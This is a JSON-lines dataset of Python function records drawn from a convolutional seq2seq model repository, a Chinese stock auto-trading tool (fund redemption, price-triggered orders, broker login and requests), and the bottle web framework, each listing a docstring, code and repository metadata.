{"docstring": "\"\"\"Creates and returns a new figure that visualizes\nattention scores for for a single model predictions.\n\"\"\"\n\n# Find out how long the predicted sequence is\n", "func_signal": "def _create_figure(predictions_dict):\n", "code": "target_words = list(predictions_dict[\"predicted_tokens\"])\n\nprediction_len = _get_prediction_length(predictions_dict)\n\n# Get source words\nsource_len = predictions_dict[\"features.source_len\"]\nsource_words = predictions_dict[\"features.source_tokens\"][:source_len]\n\n# Plot\nfig = plt.figure(figsize=(8, 8))\nplt.imshow(\n    X=predictions_dict[\"attention_scores\"][:prediction_len, :source_len],\n    interpolation=\"nearest\",\n    cmap=plt.cm.Blues)\nplt.xticks(np.arange(source_len), source_words, rotation=45)\nplt.yticks(np.arange(prediction_len), target_words, rotation=-45)\nfig.tight_layout()\n\nreturn fig", "path": "seq2seq\\tasks\\dump_attention.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Wraps a decoder into a Beam Search decoder.\n\nArgs:\n  decoder: The original decoder\n\nReturns:\n  A BeamSearchDecoder with the same interfaces as the original decoder.\n\"\"\"\n", "func_signal": "def _get_beam_search_decoder(self, decoder):\n", "code": "config = beam_search.BeamSearchConfig(\n    beam_width=self.params[\"inference.beam_search.beam_width\"],\n    vocab_size=self.target_vocab_info.total_size,\n    eos_token=self.target_vocab_info.special_vocab.SEQUENCE_END,\n    length_penalty_weight=self.params[\n        \"inference.beam_search.length_penalty_weight\"],\n    choose_successors_fn=getattr(\n        beam_search,\n        self.params[\"inference.beam_search.choose_successors_fn\"]))\nreturn BeamSearchDecoder(decoder=decoder, config=config)", "path": "seq2seq\\models\\seq2seq_model.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Creates the metric op\"\"\"\n", "func_signal": "def create_metric_ops(self, _inputs, labels, predictions):\n", "code": "loss_mask = tf.sequence_mask(\n    lengths=tf.to_int32(labels[\"target_len\"] - 1),\n    maxlen=tf.to_int32(tf.shape(predictions[\"losses\"])[1]))\nreturn metrics.streaming_mean(predictions[\"losses\"], loss_mask)", "path": "seq2seq\\metrics\\metric_specs.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Creates (value, update_op) tensors\n\"\"\"\n", "func_signal": "def create_metric_ops(self, _inputs, labels, predictions):\n", "code": "with tf.variable_scope(self._name):\n\n  # Join tokens into single strings\n  predictions_flat = tf.reduce_join(\n      predictions[\"predicted_tokens\"], 1, separator=self._separator)\n  labels_flat = tf.reduce_join(\n      labels[\"target_tokens\"], 1, separator=self._separator)\n\n  sources_value, sources_update = accumulate_strings(\n      values=predictions_flat, name=\"sources\")\n  targets_value, targets_update = accumulate_strings(\n      values=labels_flat, name=\"targets\")\n\n  metric_value = tf.py_func(\n      func=self._py_func,\n      inp=[sources_value, targets_value],\n      Tout=tf.float32,\n      name=\"value\")\n\nwith tf.control_dependencies([sources_update, targets_update]):\n  update_op = tf.identity(metric_value, name=\"update_op\")\n\nreturn metric_value, update_op", "path": "seq2seq\\metrics\\metric_specs.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "# Pre-process features and labels\n", "func_signal": "def _build(self, features, labels, params):\n", "code": "features, labels = self._preprocess(features, labels)\n\nencoder_output = self.encode(features, labels)\ndecoder_output, _, = self.decode(encoder_output, features, labels)\n\nif self.mode == tf.contrib.learn.ModeKeys.INFER:\n  loss = None\n  train_op = None\n  \n  predictions = self._create_predictions(\n      decoder_output=decoder_output, features=features, labels=labels)\nelse:\n  losses, loss = self.compute_loss(decoder_output, features, labels)\n\n  train_op = None\n  if self.mode == tf.contrib.learn.ModeKeys.TRAIN:\n    gradient_multipliers = {}\n    # multiply the gradient by 1.0/(2*#att_layer)       \n    for i in tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope='model/conv_seq2seq/encode'):\n      if 'encode/W' in i.name or 'encode/pos' in i.name:\n        continue\n      tf.logging.info(\"tensor %s, name is %s\", i, i.name)\n      gradient_multipliers[i] = 1.0/(2*self.params[\"decoder.params\"][\"cnn.layers\"])\n    #tf.logging.info(\"gradient_multipliers %s\",gradient_multipliers)\n    train_op = self._build_train_op(loss, gradient_multipliers=gradient_multipliers)\n  \n  predictions = self._create_predictions(\n      decoder_output=decoder_output,\n      features=features,\n      labels=labels,\n      losses=losses)\n\n# We add \"useful\" tensors to the graph collection so that we\n# can easly find them in our hooks/monitors.\ngraph_utils.add_dict_to_collection(predictions, \"predictions\")\n\nreturn predictions, loss, train_op", "path": "seq2seq\\models\\seq2seq_model.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Returns the embedding used for the source sequence.\n\"\"\"\n", "func_signal": "def source_embedding(self):\n", "code": "return tf.get_variable(\n    name=\"W\",\n    shape=[self.source_vocab_info.total_size, self.params[\"embedding.dim\"]],\n    initializer=tf.random_uniform_initializer(\n        -self.params[\"embedding.init_scale\"],\n        self.params[\"embedding.init_scale\"]))", "path": "seq2seq\\models\\seq2seq_model.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Wrapper function that converts tensors to unicode and slices\n  them until the EOS token is found.\n\"\"\"\n# Deal with byte chars\n", "func_signal": "def _py_func(self, hypotheses, references):\n", "code": "if hypotheses.dtype.kind == np.dtype(\"U\"):\n  hypotheses = np.char.encode(hypotheses, \"utf-8\")\nif references.dtype.kind == np.dtype(\"U\"):\n  references = np.char.encode(references, \"utf-8\")\n\n# Convert back to unicode object\nhypotheses = [_.decode(\"utf-8\") for _ in hypotheses]\nreferences = [_.decode(\"utf-8\") for _ in references]\n\n# Slice all hypotheses and references up to SOS -> EOS\nsliced_hypotheses = [postproc.slice_text(\n    _, self._eos_token, self._sos_token) for _ in hypotheses]\nsliced_references = [postproc.slice_text(\n    _, self._eos_token, self._sos_token) for _ in references]\n\n# Apply postprocessing function\nif self._postproc_fn:\n  sliced_hypotheses = [self._postproc_fn(_) for _ in sliced_hypotheses]\n  sliced_references = [self._postproc_fn(_) for _ in sliced_references]\n\nreturn self.metric_fn(sliced_hypotheses, sliced_references) #pylint: disable=E1102", "path": "seq2seq\\metrics\\metric_specs.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Creates an InputPipeline object from a dictionary definition.\n\nArgs:\n  def_dict: A dictionary defining the input pipeline.\n    It must have \"class\" and \"params\" that correspond to the class\n    name and constructor parameters of an InputPipeline, respectively.\n  mode: A value in tf.contrib.learn.ModeKeys\n\nReturns:\n  A new InputPipeline object\n\"\"\"\n", "func_signal": "def make_input_pipeline_from_def(def_dict, mode, **kwargs):\n", "code": "if not \"class\" in def_dict:\n  raise ValueError(\"Input Pipeline definition must have a class property.\")\n\nclass_ = def_dict[\"class\"]\nif not hasattr(sys.modules[__name__], class_):\n  raise ValueError(\"Invalid Input Pipeline class: {}\".format(class_))\n\npipeline_class = getattr(sys.modules[__name__], class_)\n\n# Constructor arguments\nparams = {}\nif \"params\" in def_dict:\n  params.update(def_dict[\"params\"])\nparams.update(kwargs)\n\nreturn pipeline_class(params=params, mode=mode)", "path": "seq2seq\\data\\input_pipeline.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"\n\u8d4e\u56de\u573a\u5916\u57fa\u91d1\n:param code: \u4ee3\u7801\n:type code: str\n:param amount: \u6570\u91cf\n:type amount: int\n:param market: \u5e02\u573a, 'sh'\u4e3a\u4e0a\u6d77; 'sz'\u4e3a\u6df1\u5733\n:type market: str\n:return: \u59d4\u6258\u53f7, -1\u8868\u793a\u5931\u8d25\n:rtype: int\n\"\"\"\n", "func_signal": "def fund_redeem(self, code, amount, market='sh'):\n", "code": "if market.lower() == 'sh':\n    return self._fund_apply_redeem(exchange_type=1, stock_code=code, amount=amount, apply_or_redeem=2)\nelif market.lower() == 'sz':\n    return self._fund_apply_redeem(exchange_type=2, stock_code=code, amount=amount, apply_or_redeem=2)\nreturn self.TRADE_FAIL", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u5728\u4ef7\u683c\u9ad8\u4e8e\u67d0\u4e2a\u503c\u65f6\u5356\u51fa\n:param code: \u4ee3\u7801\n:type code: str\n:param market: \u5e02\u573a, sh\u6216sz\n:type market: str\n:param amount: \u6570\u91cf\n:type amount: int\n:param price: \u4ef7\u683c\n:type price: float\n:param time_stamp: \u65f6\u95f4\u6233\n:type time_stamp: datetime\n:return: None\u4e3a\u5931\u8d25, \u6210\u529f\u8fd4\u56dejob\n:rtype: Job\n\"\"\"\n\n", "func_signal": "def sell_when_price_exceed(self, code, market, amount, price, time_stamp):\n", "code": "query_code = market + code\n\nif query_code not in self.quotes:\n    return None\nquote = self.quotes[query_code]\naverage_price, amount_sell, amount_all_bid, lowest_price \\\n    = get_average_price_of_certain_amount_sell(quote, amount)\n\nif average_price >= price and amount_sell >= amount:\n    job = self.create_new_job(time_stamp)\\\n        .set(Job.SELL, code, market, amount, price,\n             msg='\u5e02\u573a\u4ef7\u683c%.3f\u5927\u4e8e\u7b49\u4e8e\u76ee\u6807\u4ef7\u683c%.3f, \u5356\u51fa%s %d\u80a1' % (average_price, price, code, amount))\n    return job\nelse:\n    return None", "path": "Modules\\Module.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u5728\u4ef7\u683c\u4f4e\u4e8e\u67d0\u4e2a\u503c\u65f6\u8d2d\u4e70\n:param code: \u4ee3\u7801\n:type code: str\n:param market: \u5e02\u573a, sh\u6216sz\n:type market: str\n:param amount: \u6570\u91cf\n:type amount: int\n:param price: \u4ef7\u683c\n:type price: float\n:param time_stamp: \u65f6\u95f4\u6233\n:type time_stamp: datetime\n:return: None\u4e3a\u5931\u8d25, \u6210\u529f\u8fd4\u56dejob\n:rtype: Job\n\"\"\"\n\n", "func_signal": "def buy_when_price_exceed(self, code, market, amount, price, time_stamp):\n", "code": "query_code = market + code\n\nif query_code not in self.quotes:\n    return None\nquote = self.quotes[query_code]\naverage_price, amount_buy, amount_all_ask, highest_price \\\n    = get_average_price_of_certain_amount_buy(quote, amount)\n\nif average_price <= price and amount_buy >= amount:\n    job = self.create_new_job(time_stamp)\\\n        .set(Job.BUY, code, market, amount, price,\n             msg='\u5e02\u573a\u4ef7\u683c%.3f\u5c0f\u4e8e\u7b49\u4e8e\u76ee\u6807\u4ef7\u683c%.3f, \u4e70\u5165%s %d\u80a1' % (average_price, price, code, amount))\n    return job\nelse:\n    return None", "path": "Modules\\Module.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u68c0\u67e5\u5f53\u524d\u65f6\u95f4\u548c\u76ee\u6807\u65f6\u95f4\u7684\u5173\u7cfb\n:param hour: hour \u8303\u56f40-23\n:type hour: int\n:param minute: \u8303\u56f40-59\n:type minute: int\n:param second: \u8303\u56f40-59\n:type second: int\n:return: \u5f53\u524d\u65f6\u95f4\u5927\u4e8e\u76ee\u6807\u65f6\u95f4\u65f6\u8fd4\u56de1, \u5f53\u524d\u65f6\u95f4\u7b49\u4e8e\u76ee\u6807\u65f6\u95f4\u65f6\u8fd4\u56de0, \u5f53\u524d\u65f6\u95f4\u5c0f\u4e8e\u76ee\u6807\u65f6\u95f4\u65f6\u8fd4\u56de-1\n:rtype: int\n\"\"\"\n", "func_signal": "def check_current_time_to(self, hour=00, minute=00, second=00):\n", "code": "now = datetime.now()\ntarget = datetime.now().replace(hour=hour, minute=minute, second=second)\nif now > target:\n    return 1\nif now == target:\n    return 0\nif now < target:\n    return -1", "path": "Modules\\Module.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\nmodule\u8f7d\u5165\u51fd\u6570\n:param module: module\u7684\u5b9e\u4f8b\n:type module: Modules.Module.Module\n:return:\n:rtype:\n\"\"\"\n# \u521d\u59cb\u5316module\n", "func_signal": "def load_module(self, module):\n", "code": "module_no = len(self.__modules)\n# \u7ed9module\u8bbe\u7f6etrader\nmodule.set_trader(self.__trader)\n# \u51c6\u5907module, \u901a\u5e38\u5728\u8be5\u6b65\u9aa4\u8bfb\u53d6config\u6587\u4ef6, \u6216\u8005\u83b7\u53d6\u8d26\u6237\u4fe1\u606f\nmodule.prepare(module_no)\n# \u5c06module\u52a0\u5165\u5217\u8868\nself.__modules.append(module)", "path": "AutoTrade.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u8d27\u5e01\u57fa\u91d1\u7533\u8d2d\u548c\u8d4e\u56de\u51fd\u6570, \u4e0d\u8981\u76f4\u63a5\u8c03\u7528\n:param exchange_type: \u4ea4\u6613\u5e02\u573a, 1\u4e3a\u4e0a\u6d77; 2\u4e3a\u6df1\u5733\n:type exchange_type: int\n:param stock_code: \u4ee3\u7801\n:type stock_code: str\n:param amount: \u6570\u91cf\n:type amount: int\n:param apply_or_redeem: \u4ea4\u6613\u7c7b\u578b, 1\u4e3a\u7533\u8d2d; 2\u4e3a\u8d4e\u56de\n:type apply_or_redeem: int\n:return: \u59d4\u6258\u53f7, -1\u6807\u8bc6\u5931\u8d25\n:rtype: int\n\"\"\"\n", "func_signal": "def _money_fund_apply_redeem(self, exchange_type, stock_code, amount, apply_or_redeem):\n", "code": "query = {\n    'classname': 'com.gf.etrade.control.StockUF2Control',\n    'method': 'HBJJSS',\n}\npayload = {\n    'stock_code': stock_code,\n    'exchange_type': exchange_type,\n    'entrust_amount': amount,\n    'entrust_bs': apply_or_redeem  # 1\u4e3a\u7533\u8d2d, 2\u4e3a\u8d4e\u56de\n}\nresult = self.__connect_trade_server(query, payload)\nif result:\n    for order in result['data']:\n        if 'entrust_no' in order:\n            return int(order['entrust_no'])\nreturn self.TRADE_FAIL", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u5224\u65ad\u4ea4\u6613\u7cfb\u7edf\u662f\u5426\u7b26\u5408\u9000\u51fa\u7684\u6761\u4ef6, \u6682\u5b9a\u4e3a\u5e02\u573a\u5173\u95ed\u540e\u81ea\u52a8\u9000\u51fa\n:return: \u5f53\u5e02\u573a\u5173\u95ed\u540e(15:00\u4e4b\u540e), \u8fd4\u56deTrue, \u5426\u5219\u8fd4\u56deFalse\n:rtype: bool\n\"\"\"\n", "func_signal": "def ready_to_exit(self):\n", "code": "if self.__current_time > self.__market_close_time:\n    logging.warning('\u73b0\u5728\u4e0d\u662f\u4ea4\u6613\u65f6\u95f4, \u81ea\u52a8\u9000\u51fa\u4ea4\u6613, \u5982\u679c\u9700\u8981\u6539\u53d8\u9000\u51fa\u6761\u4ef6,\u8bf7\u4fee\u6539 AutoTrade.py\u7684ready_to_exit\u51fd\u6570')\n    return True\nreturn False", "path": "AutoTrade.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "# \u8fde\u63a5\u6b22\u8fce\u9875\u9762,\u83b7\u53d6\u9a8c\u8bc1\u7801\n", "func_signal": "def try_auto_login(self):\n", "code": "self.prepare_login()\n# \u8bc6\u522b\u9a8c\u8bc1\u7801\nverify_code = self.recognize_verify_code()\n# \u8f93\u5165\u9a8c\u8bc1\u7801\nself.enter_verify_code(verify_code)\n# \u767b\u5f55\nreturn self.login()", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u7533\u8d2d\u573a\u5185\u57fa\u91d1\n:param code: \u4ee3\u7801\n:type code: str\n:param amount: \u6570\u91cf\n:type amount: int\n:param market: \u5e02\u573a, 'sh'\u4e3a\u4e0a\u6d77; 'sz'\u4e3a\u6df1\u5733\n:type market: str\n:return: \u59d4\u6258\u53f7, -1\u8868\u793a\u5931\u8d25\n:rtype: int\n\"\"\"\n", "func_signal": "def fund_apply(self, code, amount, market='sh'):\n", "code": "if market.lower() == 'sh':\n    return self._fund_apply_redeem(exchange_type=1, stock_code=code, amount=amount, apply_or_redeem=1)\nelif market.lower() == 'sz':\n    return self._fund_apply_redeem(exchange_type=2, stock_code=code, amount=amount, apply_or_redeem=1)\nreturn self.TRADE_FAIL", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u9000\u51fa\u7cfb\u7edf\n:return:\n:rtype:\n\"\"\"\n", "func_signal": "def exit(self):\n", "code": "self.__trader.sign_out_socket()\nself.__trader.exit()\n# self.report('INFO', 'AutoTrade system Now exit!')", "path": "AutoTrade.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "# \u6bcf\u6b21\u53d1\u9001\u643a\u5e26\u7684sessionId\u4e0d\u80fd\u4e3aNone\n", "func_signal": "def __connect_trade_server(self, query, payload, no_judgement=False):\n", "code": "if self.__dse_sessionId is None:\n    return None\nelse:\n    stamp = '&dse_sessionId=' + self.__dse_sessionId\n# \u5c06query\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\nquery_string = ''\nif query:\n    query_string = '?' + self.__join_keys(query) + stamp\n\nif payload:\n    payload['dse_sessionId'] = self.__dse_sessionId\n\n# \u8fde\u63a5\u4ea4\u6613\u670d\u52a1\u5668\nurl = self.__trade_page + query_string\n# logging.info(query_string)\n# for k, v in payload.items():\n#     logging.info('%s\\t:\\t%s' % (k, v))\nresp = self.__browser.post(url, data=payload)\n# \u83b7\u53d6\u8fd4\u56de\u6570\u636e, \u7ed9key\u52a0\u4e0a\u53cc\u5f15\u53f7\ncontent = resp.text.replace('\\n', '').replace('\\'', '\\\"')\ntry:\n    return_in_json = json.loads(content, parse_int=int)\n    logging.info('return raw is: ' + content)\nexcept:\n    content = re.sub(r'([^{\":,]+):', '\\\"\\\\1\\\":', content)\n    logging.info('return raw is: ' + content)\n    return_in_json = json.loads(content)\n\n# \u5982\u679c\u4e0d\u9700\u8981\u5224\u65ad\u662f\u5426\u8fd4\u56de\u6b63\u5e38,\u5219\u76f4\u63a5\u8fd4\u56de\u6570\u636e.\nif no_judgement:\n    return return_in_json\n# \u5224\u65ad\u8fd4\u56de\u6570\u636e\u662f\u5426\u6210\u529f\nif 'success' in return_in_json and return_in_json['success'] is True:\n    return return_in_json\nelse:\n    return None", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u7533\u8d2d\u8d27\u5e01\u57fa\u91d1\n:param code: \u4ee3\u7801\n:type code: str\n:param amount: \u6570\u91cf\n:type amount: int\n:param market: \u5e02\u573a, 'sh'\u4e3a\u4e0a\u6d77; 'sz'\u4e3a\u6df1\u5733\n:type market: str\n:return: \u59d4\u6258\u53f7, -1\u8868\u793a\u5931\u8d25\n:rtype: int\n\"\"\"\n", "func_signal": "def money_fund_apply(self, code, amount, market='sh'):\n", "code": "if market.lower() == 'sh':\n    return self._money_fund_apply_redeem(exchange_type=1, stock_code=code, amount=amount, apply_or_redeem=1)\nelif market.lower() == 'sz':\n    return self._money_fund_apply_redeem(exchange_type=2, stock_code=code, amount=amount, apply_or_redeem=1)\nreturn self.TRADE_FAIL", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "# \u5efa\u7acb\u521d\u59cb\u8fde\u63a5\n", "func_signal": "def prepare_login(self):\n", "code": "self.__browser.get(self.__welcome_page, verify=False)\n# \u83b7\u53d6\u9a8c\u8bc1\u7801\nreturn self.get_verify_code()", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u573a\u5185\u57fa\u91d1\u5408\u5e76\u51fd\u6570(\u4e0d\u5305\u62ec\u4e0a\u6d77lof)\n:param stock_code: \u4ee3\u7801\n:type stock_code: str\n:param amount: \u6570\u91cf\n:type amount: int\n:return: \u59d4\u6258\u53f7\n:rtype: int, -1\u8868\u793a\u5931\u8d25\n\"\"\"\n", "func_signal": "def fund_merge(self, stock_code, amount):\n", "code": "query = {}\npayload = {\n    'classname': 'com.gf.etrade.control.StockUF2Control',\n    'method': 'doMerge',\n    'stock_code': stock_code,\n    'merge_amount': amount\n}\nresult = self.__connect_trade_server(query, payload)\nif result:\n    for order in result['data']:\n        if 'entrust_no' in order:\n            return int(order['entrust_no'])\nelse:\n    return self.TRADE_FAIL", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u83b7\u53d6module\u7684\u5173\u6ce8\u5217\u8868\n:return:\n:rtype:\n\"\"\"\n", "func_signal": "def __get_focus_list_from_module(self):\n", "code": "focus_list = list()\nfor m in self.__modules:\n    focus_list += m.focus_list()\nself.__focus_list = focus_list", "path": "AutoTrade.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u68c0\u67e5\u5f53\u524d\u65e5\u671f\u548c\u76ee\u6807\u65e5\u671f\u7684\u5173\u7cfb\n:param year: \u5e74\n:type year: int\n:param month: month\n:type month: int\n:param date: date\n:type date: int\n:return: \u5f53\u524d\u65e5\u671f\u5927\u4e8e\u76ee\u6807\u65e5\u671f\u65f6\u8fd4\u56de1, \u5f53\u524d\u65e5\u671f\u7b49\u4e8e\u76ee\u6807\u65e5\u671f\u65f6\u8fd4\u56de0, \u5f53\u524d\u65e5\u671f\u5c0f\u4e8e\u76ee\u6807\u65e5\u671f\u65f6\u8fd4\u56de-1\n:rtype: int\n\"\"\"\n", "func_signal": "def check_current_date_to(year=datetime.now().year, month=1, dates=1):\n", "code": "now = datetime.now().date()\ntarget = date(year, month, dates)\nif now > target:\n    return 1\nif now == target:\n    return 0\nif now < target:\n    return -1", "path": "Modules\\Module.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u573a\u5185\u57fa\u91d1\u7533\u8d2d\u548c\u8d4e\u56de\u51fd\u6570, \u4e0d\u8981\u76f4\u63a5\u8c03\u7528\n:param exchange_type: \u4ea4\u6613\u5e02\u573a, 1\u4e3a\u4e0a\u6d77; 2\u4e3a\u6df1\u5733\n:type exchange_type: int\n:param stock_code: \u4ee3\u7801\n:type stock_code: str\n:param amount: \u6570\u91cf\n:type amount: int\n:param apply_or_redeem: \u4ea4\u6613\u7c7b\u578b, 1\u4e3a\u7533\u8d2d; 2\u4e3a\u8d4e\u56de\n:type apply_or_redeem: int\n:return: \u59d4\u6258\u53f7, -1\u6807\u8bc6\u5931\u8d25\n:rtype: int\n\"\"\"\n", "func_signal": "def _fund_apply_redeem(self, exchange_type, stock_code, amount, apply_or_redeem):\n", "code": "query = {\n    'classname': 'com.gf.etrade.control.StockUF2Control',\n    'method': 'CNJJSS',\n}\npayload = {\n    'stock_code': stock_code,\n    'exchange_type': exchange_type,\n    'entrust_amount': amount,\n    'entrust_bs': apply_or_redeem  # 1\u4e3a\u7533\u8d2d, 2\u4e3a\u8d4e\u56de\n}\nresult = self.__connect_trade_server(query, payload)\nif result:\n    for order in result['data']:\n        if 'entrust_no' in order:\n            return int(order['entrust_no'])\nreturn self.TRADE_FAIL", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u5c06\u62a5\u4ef7\u63d0\u4f9b\u7ed9modules, \u89e6\u53d1module\u7684\u5224\u65ad\u673a\u5236\n:return:\n:rtype:\n\"\"\"\n", "func_signal": "def __feed_quotes_back_to_modules(self):\n", "code": "for m in self.__modules:\n    jobs = m.need_to_trade(self.__quotes, self.__current_time)\n    if jobs is not None:\n        self.__trader.add_jobs_to_pending_list(jobs)", "path": "AutoTrade.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "\"\"\"\n\u573a\u5185\u57fa\u91d1\u5206\u62c6\u51fd\u6570(\u4e0d\u5305\u62ec\u4e0a\u6d77lof)\n:param stock_code: \u4ee3\u7801\n:type stock_code: str\n:param amount: \u6570\u91cf\n:type amount: int\n:return: \u59d4\u6258\u53f7\n:rtype: int, -1\u8868\u793a\u5931\u8d25\n\"\"\"\n", "func_signal": "def fund_split(self, stock_code, amount):\n", "code": "query = {}\npayload = {\n    'classname': 'com.gf.etrade.control.StockUF2Control',\n    'method': 'doSplit',\n    'stock_code': stock_code,\n    'split_amount': amount\n}\nresult = self.__connect_trade_server(query, payload)\nif result:\n    for order in result['data']:\n        if 'entrust_no' in order:\n            return int(order['entrust_no'])\nelse:\n    return self.TRADE_FAIL", "path": "Socket\\GFSocket.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "# \u5982\u679c\u662f\u64a4\u5355\u7684\u8bdd,\u9700\u8981entrust_no\u5927\u4e8e0\n", "func_signal": "def set(self, action, code, market, amount, price, depend=None, msg='', cancel_job=None):\n", "code": "if action == Job.CANCEL:\n    if cancel_job is not None and isinstance(cancel_job, Job):\n        self.__action = Job.CANCEL\n        self.__cancel_serial_no = cancel_job.serial_no\n        self.add_dependence(depend)\nelse:\n    self.__action = action\n    self.__code = code\n    self.__market = market\n    self.__amount = amount\n    self.__price = price\n    self.__msg = msg\n    self.add_dependence(depend)\nreturn self", "path": "Trade\\Job.py", "repo_name": "changye/AutoTrade", "stars": 390, "license": "None", "language": "python", "size": 616}
{"docstring": "''' An instance of :class:`HeaderDict`, a case-insensitive dict-like\n    view on the response headers. '''\n", "func_signal": "def headers(self):\n", "code": "self.__dict__['headers'] = hdict = HeaderDict()\nhdict.dict = self._headers\nreturn hdict", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Returns a copy of self. '''\n", "func_signal": "def copy(self):\n", "code": "copy = Response()\ncopy.status = self.status\ncopy._headers = dict((k, v[:]) for (k, v) in self._headers.items())\nreturn copy", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Close the application and all installed plugins. '''\n", "func_signal": "def close(self):\n", "code": "for plugin in self.plugins:\n    if hasattr(plugin, 'close'): plugin.close()\nself.stopped = True", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Mount an application (:class:`Bottle` or plain WSGI) to a specific\n    URL prefix. Example::\n\n        root_app.mount('/admin/', admin_app)\n\n    :param prefix: path prefix or `mount-point`. If it ends in a slash,\n        that slash is mandatory.\n    :param app: an instance of :class:`Bottle` or a WSGI application.\n\n    All other parameters are passed to the underlying :meth:`route` call.\n'''\n", "func_signal": "def mount(self, prefix, app, **options):\n", "code": "if isinstance(app, basestring):\n    prefix, app = app, prefix\n    depr('Parameter order of Bottle.mount() changed.') # 0.10\n\nparts = filter(None, prefix.split('/'))\nif not parts: raise ValueError('Empty path prefix.')\npath_depth = len(parts)\noptions.setdefault('skip', True)\noptions.setdefault('method', 'ANY')\n\n@self.route('/%s/:#.*#' % '/'.join(parts), **options)\ndef mountpoint():\n    try:\n        request.path_shift(path_depth)\n        rs = BaseResponse([], 200)\n        def start_response(status, header):\n            rs.status = status\n            for name, value in header: rs.add_header(name, value)\n            return rs.body.append\n        rs.body = itertools.chain(rs.body, app(request.environ, start_response))\n        return HTTPResponse(rs.body, rs.status_code, rs.headers)\n    finally:\n        request.path_shift(-path_depth)\n\nif not prefix.endswith('/'):\n    self.route('/' + '/'.join(parts), callback=mountpoint, **options)", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Yield all Plugins affecting this route. '''\n", "func_signal": "def all_plugins(self):\n", "code": "unique = set()\nfor p in reversed(self.app.plugins + self.plugins):\n    if True in self.skiplist: break\n    name = getattr(p, 'name', False)\n    if name and (name in self.skiplist or name in unique): continue\n    if p in self.skiplist or type(p) in self.skiplist: continue\n    if name: unique.add(name)\n    yield p", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Trigger a hook and return a list of results. '''\n", "func_signal": "def trigger(self, name, *a, **ka):\n", "code": "hooks = self.hooks[name]\nif ka.pop('reversed', False): hooks = hooks[::-1]\nreturn [hook(*a, **ka) for hook in hooks]", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
